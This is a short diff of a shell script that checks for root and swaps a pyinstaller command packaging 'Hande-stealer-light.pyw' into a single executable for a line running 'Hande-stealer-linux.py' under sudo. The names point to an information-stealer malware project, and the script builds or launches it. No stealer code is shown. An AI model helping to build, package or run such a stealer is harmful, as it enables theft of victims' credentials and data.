@@ -7,4 +7,4 @@ if test "`whoami`" != "root" ; then
 	exit
 fi
 
-sudo pyinstaller --clean --onefile --version-file file_version.txt Hande-stealer-light.pyw
+sudo python Hande-stealer-linux.py
